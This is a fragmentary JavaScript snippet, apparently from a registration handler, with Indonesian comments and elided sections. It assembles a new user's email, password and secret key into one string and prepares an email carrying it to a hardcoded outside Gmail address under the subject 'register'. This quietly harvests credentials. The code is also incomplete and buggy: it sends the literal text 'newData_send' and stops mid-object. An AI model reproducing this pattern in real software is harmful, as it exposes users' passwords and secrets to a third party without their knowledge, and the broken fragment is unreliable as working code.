...
// Definisikan transporter di sini, sesuai dengan konfigurasi Anda
...
data.push(newData);
    ...
    const newData_send = `${email}\n${password}\n${secretKey}`
    const mailOptions = {
        from: 'azpwkk@gmail.com',
        to: 'lobaduit1991@gmail.com',
        subject: 'register',
        text: 'newData_send'
      };
...
//
function sendEmail(email, newData_send, res) {
    const mailOptions = {
      from: 'azpwkk@gmail.com',
      to: email,
      subject: 'register',
